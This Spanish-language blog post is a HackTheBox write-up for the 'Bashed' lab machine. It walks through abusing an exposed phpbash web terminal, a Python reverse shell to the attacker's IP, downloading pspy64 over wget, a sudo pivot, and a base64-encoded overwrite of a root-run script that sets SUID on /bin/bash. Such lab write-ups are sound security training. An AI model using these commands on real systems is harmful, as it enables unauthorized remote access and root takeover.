---
layout: single
title: Writeup HTB - Maquina Bashed
comments: true
excerpt: "La maquina Bashed es una maquina linux - Easy, que nos presenta una aplicacion web que ejecuta comandos en el servidor modo terminal web, aprovechamos esto para obtener una reverse shell y ejecutamos commandos como el user www-data, posteriormente escalamos privilegios como el usuario scriptmanager haciendo uso de los permisos de sudo. Finalmente logramos escalar privilegios como el usuario root modificando el archivo test.py ya que habia una tarea que ejecutaba dicho archivo como usuario root."
date: 2022-02-02
classes: wide
header:
  teaser: /assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP  
  - Hacking
  - Linux
  - Easy
  - phpbash
  - dirsearch
  - sudo
---


# Bashed

<p align="center">
<img src="/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled.png">
</p>


## Resumen

<div style="text-align: justify">
La maquina Bashed es una maquina linux - Easy, que nos presenta una aplicacion web que ejecuta comandos en el servidor modo terminal web, aprovechamos esto para obtener una reverse shell y ejecutamos commandos como el user www-data, posteriormente escalamos privilegios como el usuario scriptmanager haciendo uso de los permisos de sudo. Finalmente logramos escalar privilegios como el usuario root modificando el archivo test.py ya que habia una tarea que ejecutaba dicho archivo como usuario root.
</div>

## Scan Nmap

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%201.png)

## Pagina web - Port 80

bueno ya que tenemos solo un puerto esta maquina, revisemos la pagina web para ver que contiene. 

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%202.png)

vemos que tenemos una aplicacion llamada phpbash, si acedemos al enlace de la pagina vemos una url en la imagen

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%203.png)

intentamos acceder a dicha url pero sin exito

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%204.png)

tambien vemos que nos proporcionan un repositorio de la aplicacion

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%205.png)

por lo tanto hare un escaneo de directorios con dirsearch

```bash
bashed # ❯ dirsearch -u http://10.129.160.128 -w /usr/share/wordlists/dirb/common.txt -f -e php,html,js,txt,save,bak
```

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%206.png)

entonces me interesa la ruta dev y vemos que contiene los archivos del repositorio

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%207.png)

dicha aplicacion nos permite ejecutar comandos en el servidor de una terminal web

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%208.png)

## Reverse shell - User www-data

asi que aprovecharemos la ejecucion de comandos para obtener una reverse shell, primero dejaremos el puerto 443 en escucha con netcat

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%209.png)

y  agremos el siguiente payload a la aplicacion vulnerable

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.54",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

logrando conectarnos siendo el user www-data

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%2010.png)

## Escalacion de privilegios - user scripts

revisando los permisos de sudoers, encontramos que podemos ejecutar cualquier comando con el user scriptmanager

```bash
www-data@bashed:/tmp$ sudo -l
```

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%2011.png)

asi que obtenemos una sesion con dicho usuario de la siguiente manera

```bash
www-data@bashed:/tmp$ sudo -u scriptmanager /bin/bash
```

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%2012.png)

## Escalacion de privilegios - user root

para escalar privilegios descargare en la maquina victima la herramienta pspy64, ya que dicha herramienta monitoreara todo los procesos y tareas que se ejecuten en la maquina victima. Asi pues para realizar este cometido crearemos un servidor web en python

```bash
bashed # > python3 -m http.server 80
```

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%2013.png)

y descargamos nuestra herramienta de la siguiente manera

```bash
www-data@bashed:/tmp$ wget http://10.10.14.54/pspy64
```

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%2014.png)

ejecutamos nuestra herramienta pspy64

```bash
scriptmanager@bashed:/scripts$ chmod +x pspy64 
scriptmanager@bashed:/scripts$ ./pspy64
```

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%2015.png)

notamos que se esta ejecutando un script test.py

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%2016.png)

si revisamos la carpeta de dicho archivo vemos que podriamos modificar test.py para ejecutar algun comando que nos ayude a escalar privilegios a root

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%2017.png)

Por lo tanto modificaremos test.py de esta manera para otorgar permisos de suid al binario bash de esa manera podremos lograr ser root!!

```bash
scriptmanager@bashed:/scripts$ echo aW1wb3J0IG9zCm9zLnN5c3RlbSgnY2htb2QgdStzIC9iaW4vYmFzaCcp | base64 -d > test.py
scriptmanager@bashed:/scripts$ cat test.py 
import os
os.system('chmod u+s /bin/bash')
```

esperamos un momento y revisamos los permisos de /bin/bash, vemos que todo funciono

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%2018.png)

asi que ejecutamos /bin/bash para ser root!!

![Untitled](/assets/images/2022-02-02-writeup-maquina-htb-bashed/Untitled%2019.png)

gracias por ver este writeup, espero que te hayas divertido tanto como yo me diverti haciendolo. Nos vemos Abeljm